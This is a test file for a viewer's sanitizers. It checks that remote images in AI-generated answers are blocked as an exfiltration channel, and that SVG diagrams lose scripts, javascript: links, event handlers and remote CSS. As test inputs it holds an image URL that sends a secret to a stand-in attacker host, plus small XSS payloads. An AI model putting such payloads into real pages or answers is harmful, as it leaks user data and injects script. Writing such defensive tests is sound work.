import { stripRemoteMedia } from '@/viewer/ai-panel'
import { sanitizeSvg } from '@/viewer/diagrams'
import { sanitizeToFragment } from '@/engine/sanitize'

describe('AI output', () => {
  test('remote images in AI answers are not loaded (exfiltration channel)', () => {
    const frag = stripRemoteMedia(
      sanitizeToFragment(
        '<p><img src="https://evil.example/?d=SECRET" alt="x"><img src="data:image/png;base64,AAAA"><img src="data:image/png;base64,AAAA" srcset="https://evil.example/a 2x"></p>',
      ),
    )
    const imgs = frag.querySelectorAll('img')
    expect(imgs).toHaveLength(1)
    expect(imgs[0]?.getAttribute('src')).toMatch(/^data:/)
    expect(frag.textContent).toContain(
      '[image not loaded: https://evil.example/?d=SECRET]',
    )
  })
})

describe('diagram SVG sanitizing', () => {
  test('keeps the scoped Mermaid stylesheet, drops unscoped or resource-loading CSS', () => {
    const scoped = sanitizeSvg(
      '<svg id="m1"><style>#m1 .node{fill:red}#m1 .edge{stroke:blue}@keyframes d{to{opacity:1}}</style><g/></svg>',
      'm1',
    )
    expect(scoped.querySelector('style')).not.toBeNull()
    const escaping = sanitizeSvg(
      '<svg id="m1"><style>#m1 .node{fill:red} body{display:none}</style></svg>',
      'm1',
    )
    expect(escaping.querySelector('style')).toBeNull()
    const loading = sanitizeSvg(
      '<svg id="m1"><style>#m1 .n{background:url(https://t.example)}</style></svg>',
      'm1',
    )
    expect(loading.querySelector('style')).toBeNull()
    expect(
      sanitizeSvg('<svg><style>#x{}</style></svg>').querySelector('style'),
    ).toBeNull()
    // Local gradient/marker references are allowed (Mermaid uses them).
    const gradient = sanitizeSvg(
      '<svg id="m1"><style>#m1 .node rect{fill:url(#m1-gradient)}</style></svg>',
      'm1',
    )
    expect(gradient.querySelector('style')).not.toBeNull()
    const remote = sanitizeSvg(
      '<svg id="m1"><style>#m1 .n{fill:url("https://t.example/x")}</style></svg>',
      'm1',
    )
    expect(remote.querySelector('style')).toBeNull()
  })

  test('strips links and scripts from Graphviz/Mermaid SVG', () => {
    const frag = sanitizeSvg(
      '<svg><a href="javascript:alert(1)"><text>x</text></a><script>alert(1)</script><g onclick="alert(1)"/></svg>',
    )
    expect(frag.querySelector('a, script')).toBeNull()
    expect(frag.querySelector('g')?.hasAttribute('onclick')).toBe(false)
  })
})
